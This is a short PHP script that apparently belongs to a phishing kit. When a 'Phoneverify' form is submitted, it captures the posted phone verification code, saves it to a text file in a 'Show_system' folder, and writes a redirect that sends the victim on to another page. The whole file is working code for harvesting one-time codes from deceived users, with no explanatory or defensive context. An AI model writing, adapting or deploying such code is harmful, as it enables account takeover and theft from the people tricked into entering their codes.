<?php


session_start();

if(isset($_POST['Phoneverify'])) 
{
    
$Page .= ' <meta http-equiv="refresh" content="0;url=./vrfphone.php" /> ';

$fPage = fopen("../Show_system/Show_Page.txt", "w");
    fwrite($fPage, $Page);



$textimage = $_SESSION['textPhoneverify'] = $_POST['textPhoneverify'];

$yagmai .= ''.$textimage.'';

$f = fopen("../Show_system/Show_Phoneverify.txt", "w");
    fwrite($f, $yagmai);




}

else {




}

?>

